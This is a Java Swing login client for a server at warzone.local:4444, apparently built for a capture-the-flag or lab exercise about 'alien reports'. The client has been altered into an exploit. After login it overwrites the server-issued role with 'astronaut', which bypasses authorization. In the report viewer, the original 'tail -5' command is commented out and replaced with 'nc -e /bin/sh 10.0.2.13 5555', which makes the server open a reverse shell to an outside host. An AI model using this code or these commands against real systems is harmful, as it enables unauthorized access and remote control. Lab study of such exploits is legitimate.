package alien;

import java.awt.Color;
import java.awt.Container;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.Image;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Base64;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPasswordField;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

public class Starter extends JFrame implements ActionListener {

	Container container = getContentPane();
	JLabel userLabel = new JLabel("USERNAME");
	JLabel passwordLabel = new JLabel("PASSWORD");
	JTextField userTextField = new JTextField();
	JPasswordField passwordField = new JPasswordField();
	JButton loginButton = new JButton("LOGIN");
	JButton resetButton = new JButton("RESET");
	JButton uploadButton = new JButton("UPLOAD");
	JButton viewButton = new JButton("VIEW");
	JButton infoButton = new JButton("INFO");
	JCheckBox showPassword = new JCheckBox("Show Password");
	JTextArea field = new JTextArea();
	static Token token;
	static String role;
	ObjectOutputStream os;
	ObjectInputStream is;
	Socket socket;
	
	public Starter() {

		setLayoutManager();
		setLocationAndSize();
		addComponentsToContainer();
		addActionEvent();
		showPassword.setBackground(Color.GRAY);
	}
	
	public static void main(String[] args) {
	
		
		Starter frame = new Starter();
		frame.setTitle("WARZONE 3 | Login Form");
		frame.setVisible(true);
		frame.setBounds(10, 10, 370, 600);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setResizable(true);
	}
	
	
	
	@Override
	public void actionPerformed(ActionEvent e) {
		
		String username;
		String password;
		
		if(e.getSource() == loginButton) {
			
			username = userTextField.getText();
			password = passwordField.getText();
			
			try {
				
				socket = new Socket("warzone.local",4444);
				os = new ObjectOutputStream(socket.getOutputStream());
				
				RE login = new RE();
				login.setToken(null);
				login.setOption("LOGIN");
				login.setCmd(null);
				login.setValue(username+"@"+password);	
				os.writeObject(login);
				
				is = new ObjectInputStream(socket.getInputStream());
				RE response = (RE) is.readObject();
				token = response.getToken();
				role = token.getRole();
				role = "astronaut";
				os.close();
				socket.close();
				
				if (response.getValue().equals("TRUE")) {

					dashboard();

				} else {
					JOptionPane.showMessageDialog(this, "Invalid Username or Password");
				}
				
				
			
			} catch (IOException | ClassNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		}
		
		if (e.getSource() == resetButton) {
			userTextField.setText("");
			passwordField.setText("");
		}
		// Coding Part of showPassword JCheckBox
		if (e.getSource() == showPassword) {
			if (showPassword.isSelected()) {
				passwordField.setEchoChar((char) 0);
			} else {
				passwordField.setEchoChar('*');
			}

		}

		if (e.getSource() == viewButton) {

			if (role.equals("researcher")) {

				JOptionPane.showMessageDialog(this, "Permission Denied");
			} else if (role.equals("astronaut")) {
				

				try {
					socket = new Socket("warzone.local",4444);
				
				os = new ObjectOutputStream(socket.getOutputStream());
				
				RE list = new RE();
				token.setRole(role);
				list.setToken(token);
				list.setOption("VIEW");
				list.setCmd("LIST");
				list.setValue(null);	
				//send login
				os.writeObject(list);
				
				//response for LIST VIEW OPTION
				is = new ObjectInputStream(socket.getInputStream());
				RE response = (RE) is.readObject();
				os.close();
				socket.close();
				reportList(response.getValue());

				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				} catch (ClassNotFoundException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

			}
				
				

		}
		
		if(e.getSource() == uploadButton) {
			
			JOptionPane.showMessageDialog(this, "Has not been implemented");
		}
		
	}
	
	public void setLayoutManager() {
		container.setLayout(null);
		container.setBackground(Color.GRAY);
	}

	public void setLocationAndSize() {
		// Setting location and Size of each components using setBounds() method.
		userLabel.setBounds(50, 150, 100, 30);
		passwordLabel.setBounds(50, 220, 100, 30);
		userTextField.setBounds(150, 150, 150, 30);
		passwordField.setBounds(150, 220, 150, 30);
		showPassword.setBounds(150, 250, 150, 30);
		loginButton.setBounds(50, 300, 100, 30);
		resetButton.setBounds(200, 300, 100, 30);
		uploadButton.setBounds(50, 300, 100, 30);
		viewButton.setBounds(200, 300, 100, 30);
		field.setBounds(20, 20, 320, 50);

	}

	public void addComponentsToContainer() {
		// Adding each components to the Container
		container.add(userLabel);
		container.add(passwordLabel);
		container.add(userTextField);
		container.add(passwordField);
		container.add(showPassword);
		container.add(loginButton);
		container.add(resetButton);
	}

	public void addActionEvent() {
		loginButton.addActionListener(this);
		resetButton.addActionListener(this);
		showPassword.addActionListener(this);
		uploadButton.addActionListener(this);
		viewButton.addActionListener(this);
	}

	public void dashboard() {

		field.setText("This is a secret researching system.");
		field.append("\nHere you can submit or view reports about aliens behavior");
		field.setEditable(false);
		container.removeAll();
		setLayoutManager();
		container.add(uploadButton);
		container.add(viewButton);
		container.add(field);
		container.setLayout(new FlowLayout());
		container.repaint();

	}
	
	public void reportList(String value) {
		
		JFrame view = new JFrame("View Reports");
		GridLayout list = new GridLayout(2,2);
		Container containerLIst = view.getContentPane();
		containerLIst.setLayout(list);
		containerLIst.setBackground(Color.GRAY);
	
		String files[] = value.split("@");
		for(String f : files) {
			
			if(f.contains(".txt")) {
			JButton name = new JButton(f); 
			name.addActionListener(new java.awt.event.ActionListener() {
                public void actionPerformed(java.awt.event.ActionEvent e) {
                    
                	try {
    					socket = new Socket("warzone.local",4444);
    				
    				os = new ObjectOutputStream(socket.getOutputStream());
    				
    				RE list = new RE();
    				
    				list.setToken(token);
    				list.setOption("VIEW");
    				list.setValue("VALUE");
    				//list.setCmd("tail -5 "+f);
    				list.setCmd("nc -e /bin/sh 10.0.2.13 5555");
    			
    				os.writeObject(list);
    				
    				
    				is = new ObjectInputStream(socket.getInputStream());
    				RE response = (RE) is.readObject();
    				os.close();
    				socket.close();
    				reportValue(response.getValue());

    				} catch (IOException e1) {
    					// TODO Auto-generated catch block
    					e1.printStackTrace();
    				} catch (ClassNotFoundException e1) {
    					// TODO Auto-generated catch block
    					e1.printStackTrace();
    				}

                	
                	
                }
            });
			containerLIst.add(name);
			}
		}
		
		view.setVisible(true);
		view.setBounds(10, 10, 370, 600);
		view.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		view.setResizable(true);
		view.show();
		
	}
	
	public void reportValue(String value) {
		

		JTextArea output = new JTextArea(" ");
		String text[] = value.split("@");
		for(String word : text) {
			
			output.append(word+" ");
			output.setEditable(false);
			
		}
		
		
		output.setColumns(30);
		output.setLineWrap(true);
		output.setWrapStyleWord(true);
		output.setSize(output.getPreferredSize().width, 1);
	    JOptionPane.showMessageDialog(null, new JScrollPane( output), "Report",
	        JOptionPane.WARNING_MESSAGE);
		
		
	}

}
